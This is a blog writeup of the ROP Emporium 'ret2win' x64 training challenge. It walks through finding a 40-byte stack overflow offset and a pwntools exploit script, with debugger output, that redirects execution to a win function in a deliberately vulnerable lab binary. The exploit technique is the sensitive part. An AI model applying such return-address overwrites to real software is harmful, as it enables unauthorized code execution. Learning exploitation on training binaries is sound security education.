---
title: ROP Emporium - ret2win (x64) - writeup
date: 2023-03-09 21:02:01 +0100
author: farrimwildaxe
categories: [Writeup,ROP Emporium]
tags: [rop,emporium,x64,ret2win,writeup,pwntools]
img_path: /assets/img/ropemporium/ret2win
published: true
---


ret2win is the first challenge in [ROP Emporium](https://ropemporium.com/) series where
you need to create very simple ROP to call specific function
in binary to get the flag.

As mentioned on challenge page we need to feed a binary with a padding bytes followed by a ROP chain - which in this challenge is an address of specific function - `ret2win()`.
Also there is additional information about the size of the payload which triggers buffer overflow - it's 40 bytes.

Ok, so lets start. First download and unzip binary, after that next thing is to check what security settings are enabled, ypu can use `checksec` tool from pwntools:

```bash
┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/ret2win]
└─$ [2023-03-9 21:36:09] checksec ./ret2win                                                                                                                                                                                                
[*] '/home/kali/ropemporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
As we see in the output above NX bit is enabled, so we can't execute our code directly on the stack, also there is partial RELRO.

Ok, so whats next? Let's check what's inside with Ghidra. As you can see on the image below except `main()` function there're also `pwnme()` and `ret2win()`

![ret2win main() function in Ghidra decompiler](ret2win-main.jpg)

Let's check what is in the `pwnme()` function:

![ret2win pwnme() function in Ghidra decompiler](ret2win-pwnme.jpg)


And last but not least, `ret2win()` function:

![ret2win ret2win() function in Ghidra decompiler](ret2win-ret2win.jpg)


`pwnme()` this function has a buffer overflow mentioned on a challenge page - it's taking 56 bytes and writing it to the 32 bytes buffer. Now, we need to confirm how many bytes we need to put to make buffer overflow and control `RSP` register. We can use `msf-pattern_create` and `msf-pattern_offset` tools for that. First we need to create a pattern:
```bash
┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/ret2win]
└─$ [2023-03-12 17:38:57] msf-pattern_create -l 64                                                                                                                                                                                         
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A

```
Next, after pattern is created, we need to run `ret2win` binary in gdb, and use a pattern in `read()` call:

![ret2win using generated pattern to find proper padding length](ret2win-pattern.jpg)

Ok, binary has crashed. In the gdb context we can see that `RSP` has `b3Ab4Ab5` pattern, let's check it in by using `msf-pattern_offset`:

```
┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/ret2win]
└─$ [2023-03-12 17:51:39] msf-pattern_offset -q b3Ab                                                                                                                                                                                       
[*] Exact match at offset 40
```
Ok, so the size of padding is `40` as mentioned on challenge page, after we verified padding size we need to put proper function address. Let's create simple pwntools script to test that:


```python
from pwn import *

context.log_level="debug"

elf = context.binary = ELF("ret2win")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()

io.recvuntil(b"> ")

address = b"B" * 8

payload = b"A" * 40 + address
io.sendline(payload)

io.interactive()
```

After running above script (`python3 exploit.py GDB`) we can see that program crashed with segmentation fault and `RSP` contains `BBBBBBBB` string as expected, so we're controling that register:

```python
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400755 in pwnme ()
------- tip of the day (disable with set show-tips off) -------
The set show-flags on setting will display CPU flags register in the regs context panel
Downloading '/usr/lib/x86_64-linux-gnu/libc.so.6' from the remote server: OK
add-symbol-file /tmp/tmp_ynsu7vp/libc.so.6 0x7f9ba83cd000 -s .note.gnu.property 0x7f9ba83cd350 -s .note.gnu.build-id 0x7f9ba83cd370 -s .note.ABI-tag 0x7f9ba83cd394 -s .hash 0x7f9ba83cd3b8 -s .gnu.hash 0x7f9ba83d1330 -s .dynsym 0x7f9ba83d5a48 -s .dynstr 0x7f9ba83e7790 -s .gnu.version 0x7f9ba83ef78c -s .gnu.version_d 0x7f9ba83f0f58 -s .gnu.version_r 0x7f9ba83f14c0 -s .rela.dyn 0x7f9ba83f1500 -s .rela.plt 0x7f9ba83f1d28 -s .relr.dyn 0x7f9ba83f2220 -s .plt 0x7f9ba83f3000 -s .plt.got 0x7f9ba83f3360 -s .text 0x7f9ba83f3380 -s __libc_freeres_fn 0x7f9ba8546df0 -s .rodata 0x7f9ba8548000 -s .interp 0x7f9ba856da90 -s .eh_frame_hdr 0x7f9ba856daac -s .eh_frame 0x7f9ba8574eb8 -s .gcc_except_table 0x7f9ba859a540 -s .tdata 0x7f9ba859b8d0 -s .tbss 0x7f9ba859b8e0 -s .init_array 0x7f9ba859b8e0 -s __libc_subfreeres 0x7f9ba859b8f0 -s __libc_atexit 0x7f9ba859b9d8 -s __libc_IO_vtables 0x7f9ba859b9e0 -s .data.rel.ro 0x7f9ba859c760 -s .dynamic 0x7f9ba859eb60 -s .got 0x7f9ba859ed60 -s .got.plt 0x7f9ba859efe8 -s .data 0x7f9ba859f1c0 -s .bss 0x7f9ba85a0880
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────
*RAX  0xb
*RBX  0x7ffef9f9a078 —▸ 0x7ffef9f9b13d ◂— '/home/kali/ropemporium/ret2win/ret2win'                                                                                                                                                         
*RCX  0x7f9ba84c5190 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */                                                                                                                                                                             
*RDX  0x1                                                                                                                                                                                                                                  
*RDI  0x7f9ba85a1a10 (_IO_stdfile_1_lock) ◂— 0x0                                                                                                                                                                                           
*RSI  0x1                                                                                                                                                                                                                                  
*R8   0x4007f0 (__libc_csu_fini) ◂— ret                                                                                                                                                                                                    
*R9   0x7f9ba85d56a0 (_dl_fini) ◂— push rbp                                                                                                                                                                                                
*R10  0x7f9ba83dcb40 ◂— 0x10001200001a7e                                                                                                                                                                                                   
*R11  0x202                                                                                                                                                                                                                                
 R12  0x0                                                                                                                                                                                                                                  
*R13  0x7ffef9f9a088 —▸ 0x7ffef9f9b164 ◂— 'COLORFGBG=15;0'                                                                                                                                                                                 
 R14  0x0                                                                                                                                                                                                                                  
*R15  0x7f9ba8603020 (_rtld_global) —▸ 0x7f9ba86042e0 ◂— 0x0                                                                                                                                                                               
*RBP  0x4141414141414141 ('AAAAAAAA')                                                                                                                                                                                                      
*RSP  0x7ffef9f99f58 ◂— 'BBBBBBBB\n'                                                                                                                                                                                                       
*RIP  0x400755 (pwnme+109) ◂— ret                                                                                                                                                                                                          
───────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x400755 <pwnme+109>    ret    <0x4242424242424242>                                                                                                                                                                                     
                                                                                                                                                                                                                                           

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffef9f99f58 ◂— 'BBBBBBBB\n'
01:0008│     0x7ffef9f99f60 ◂— 0xa /* '\n' */
02:0010│     0x7ffef9f99f68 —▸ 0x7f9ba83f418a (__libc_start_call_main+122) ◂— mov edi, eax
03:0018│     0x7ffef9f99f70 —▸ 0x7ffef9f9a060 —▸ 0x7ffef9f9a068 ◂— 0x38 /* '8' */
04:0020│     0x7ffef9f99f78 —▸ 0x400697 (main) ◂— push rbp
05:0028│     0x7ffef9f99f80 ◂— 0x100400040 /* '@' */
06:0030│     0x7ffef9f99f88 —▸ 0x7ffef9f9a078 —▸ 0x7ffef9f9b13d ◂— '/home/kali/ropemporium/ret2win/ret2win'
07:0038│     0x7ffef9f99f90 —▸ 0x7ffef9f9a078 —▸ 0x7ffef9f9b13d ◂— '/home/kali/ropemporium/ret2win/ret2win'
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0         0x400755 pwnme+109
   f 1 0x4242424242424242
   f 2              0xa
   f 3   0x7f9ba83f418a __libc_start_call_main+122
   f 4   0x7f9ba83f4245 __libc_start_main+133
   f 5         0x4005da _start+42
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 

```

So, now we need to put a proper address at the end of our payload. We can use gdb `disassemble` get the address of `ret2win()` function:

```python
pwndbg> disassemble ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret    
End of assembler dump.
pwndbg> 
```
We can use `0x0040075a` (jumping over function prologue) and if everything goes as expected we should do buffer overflow and call `ret2win()` which will print the flag. Let's update our pwntools script with the proper address:


```python
from pwn import *

context.log_level="debug"

elf = context.binary = ELF("ret2win")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()

io.recvuntil(b"> ")

address = p64(0x0040075a)
payload = b"A" * 40 + address
io.sendline(payload)

io.interactive()
```

After running our final exploit, we got the flag:
```python
┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/ret2win]
└─$ [2023-03-12 21:30:14] python3 exploit.py                                                                                                                                                                                               
[*] '/home/kali/ropemporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/kali/ropemporium/ret2win/ret2win' argv=[b'/home/kali/ropemporium/ret2win/ret2win'] : pid 1426237
[DEBUG] Received 0x100 bytes:
    b'ret2win by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!\n'
    b'What could possibly go wrong?\n'
    b"You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
    b'\n'
    b'> '
[DEBUG] Sent 0x31 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  5a 07 40 00  00 00 00 00  │AAAA│AAAA│Z·@·│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
[DEBUG] Received 0x28 bytes:
    b'Thank you!\n'
    b"Well done! Here's your flag:\n"
Thank you!
Well done! Here's your flag:
[DEBUG] Received 0x21 bytes:
    b'ROPE{a_placeholder_32byte_flag!}\n'
ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/kali/ropemporium/ret2win/ret2win' stopped with exit code 0 (pid 1426237)
[*] Got EOF while reading in interactive
```